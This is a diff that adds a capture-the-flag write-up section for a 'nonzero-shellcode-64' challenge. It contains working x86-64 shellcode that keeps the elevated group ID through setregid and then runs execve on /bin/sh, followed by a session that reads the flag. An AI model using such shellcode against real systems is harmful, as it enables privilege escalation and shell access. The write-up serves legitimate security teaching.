@@ -344,3 +344,47 @@ Reading shellcode from shellcode.bin
 $ cat flag
 cand{push_aNd_X0R}
 ```
+
+## nonzero-shellcode-64
+Again, we can use our shellcode-64 as a starting point. We can use the same push/pop and xor tricks. 
+
+### Full Script + Solve
+```gas
+#include <sys/syscall.h>
+
+.globl main
+.type main, @function
+
+main:
+    // getegid()
+    push $SYS_getegid
+    pop %rax
+    syscall
+
+    // setregid(getegid(), getegid())
+    mov %rax, %rdi
+    mov %rax, %rsi
+    push $SYS_setregid
+    pop %rax
+    syscall
+
+    // ececve("/bin/sh", 0, 0)
+    xor %rax, %rax
+    push %rax
+    mov %rax, %rsi
+    mov %rax, %rdx
+    mov $0x68732f6e69622f2f, %rax
+    push %rax
+    mov %rsp, %rdi
+    push $SYS_execve
+    pop %rax
+    syscall
+```
+```
+./nonzero-shellcode-64
+Reading shellcode from shellcode.bin
+
+$ cat flag
+cand{n0_puSh_bUt_CLTD}
+$
+```
